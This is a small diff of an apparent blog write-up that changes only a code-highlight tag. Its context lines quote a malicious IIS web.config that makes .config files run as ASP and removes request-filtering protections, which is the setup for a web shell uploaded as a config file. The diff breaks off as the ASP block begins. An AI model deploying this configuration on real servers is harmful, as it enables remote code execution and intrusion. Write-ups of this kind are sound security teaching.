@@ -69,7 +69,7 @@ Searching on the interwebs (AKA google) we find the simplest and yet functional 
 
 Adding our XML (from web.config) and removing some HTML lines resulted in the code below:
 
-{% highlight vb linenos %}
+{% highlight vb %}
 <?xml version="1.0" encoding="UTF-8"?><configuration><system.webServer><handlers accessPolicy="Read, Script, Write"><add name="new_policy" path="*.config" verb="GET" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" /></handlers><security><requestFiltering><fileExtensions><remove fileExtension=".config" /></fileExtensions><hiddenSegments><remove segment="web.config" /></hiddenSegments></requestFiltering></security></system.webServer><appSettings></appSettings></configuration>
 <!–-
 <% 
